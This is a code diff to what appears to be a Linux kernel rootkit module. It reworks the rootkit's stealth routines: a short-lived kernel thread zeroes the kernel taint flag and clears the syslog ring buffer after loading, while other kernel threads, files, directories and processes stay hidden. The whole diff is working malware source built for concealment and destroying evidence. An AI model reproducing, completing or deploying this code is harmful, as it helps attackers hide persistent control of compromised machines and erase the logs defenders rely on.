@@ -52,6 +52,7 @@ enum { PRC_RESET = -1, PRC_READ, PRC_DEC, PRC_TIMEOUT = _PRCTIMEOUT };
 struct task_struct *tsk_sniff = NULL;
 struct task_struct *tsk_prc = NULL;
 struct task_struct *tsk_tainted = NULL;
+static bool post_initmod_done;
 
 static struct proc_dir_entry *rrProcFileEntry;
 struct __lkmmod_t {
@@ -806,7 +807,6 @@ void kv_remove_proc_interface(void)
 static int _proc_watchdog(void *unused)
 {
 #ifndef DEBUG_RING_BUFFER
-	static bool clear_syslog = true;
 #endif
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
 	struct kernel_syscalls *kaddr = kv_kall_load_addr();
@@ -832,43 +832,56 @@ static int _proc_watchdog(void *unused)
 			}
 		}
 		ssleep(1);
-#ifndef DEBUG_RING_BUFFER
-		if (clear_syslog) {
-			ssleep(2);
-			sys_do_syslog_clear();
-			clear_syslog = false;
-		}
-#endif
 	}
-	return 0;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
+			kaddr->k_do_exit(0);
+#else
+			do_exit(0);
+#endif
 }
 
 /**
  * Make sure /proc/sys/kernel/tainted is zeroed for
  * things that this module will annoy the kernel
  */
-static int _reset_tainted(void *unused)
+static int _post_initmod(void *unused)
 {
-	struct kernel_syscalls *kaddr = kv_kall_load_addr();
+	struct kernel_syscalls *kaddr = (struct kernel_syscalls *)unused;
+
+	ssleep(2);
+
 	if (!kaddr) {
-		prerr("_reset_tainted: Invalid data.\n");
-		goto out;
-	}
-	while (!kthread_should_stop()) {
+		prerr("%s: taint fail.\n", __FUNCTION__);
+	} else {
 		kv_reset_tainted(kaddr->tainted);
-		ssleep(5);
 	}
 
-out:
-	return 0;
+#ifndef DEBUG_RING_BUFFER
+	sys_do_syslog_clear();
+#endif
+
+	post_initmod_done = true;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
+	kaddr->k_do_exit(0);
+#else
+	do_exit(0);
+#endif
 }
 
 static void _unroll_init(void)
 {
-	if (tsk_prc) {
+	/** give time for any temporary thread
+	 * to finish */
+	ssleep(5);
+
+	if (tsk_tainted && !IS_ERR(tsk_tainted)) {
+		kthread_stop(tsk_tainted);
+	}
+
+	if (tsk_prc && !IS_ERR(tsk_prc)) {
 		kthread_unpark(tsk_prc);
 		kthread_stop(tsk_prc);
-		kthread_stop(tsk_tainted);
 	}
 
 	_proc_rm_wrapper();
@@ -924,7 +937,9 @@ static int __init kv_init(void)
 	if (!tsk_prc)
 		goto background_error;
 
-	tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
+
+	/** short lived task */
+	tsk_tainted = kthread_run(_post_initmod, kv_kall_load_addr(), THREAD_POST_LOADING);
 	if (!tsk_tainted)
 		goto background_error;
 
@@ -958,7 +973,6 @@ cont:
 	/** hide kthreads */
 	kv_hide_task_by_pid(tsk_sniff->pid, 0, CHILDREN);
 	kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
-	kv_hide_task_by_pid(tsk_tainted->pid, 0, CHILDREN);
 
 	/** hide magic filenames, directories and processes */
 	for (name = hide_names; *name != NULL; ++name) {
@@ -1006,6 +1020,12 @@ static void __exit kv_cleanup(void)
 	sys_deinit();
 	kv_pid_cleanup();
 
+	if (!post_initmod_done && tsk_tainted && !IS_ERR(tsk_tainted)) {
+		prinfo("stop tainted thread\n");
+		kthread_stop(tsk_tainted);
+		tsk_tainted = NULL;
+	}
+
 	if (tsk_sniff && !IS_ERR(tsk_sniff)) {
 		prinfo("stop sniff thread\n");
 		kv_sock_stop_sniff(tsk_sniff);
@@ -1017,10 +1037,6 @@ static void __exit kv_cleanup(void)
 		prinfo("stop proc timeout thread\n");
 		kthread_unpark(tsk_prc);
 		kthread_stop(tsk_prc);
-	}
-	if (tsk_tainted && !IS_ERR(tsk_tainted)) {
-		prinfo("stop tainted thread\n");
-		kthread_stop(tsk_tainted);
 	}
 
 	fs_names_cleanup();
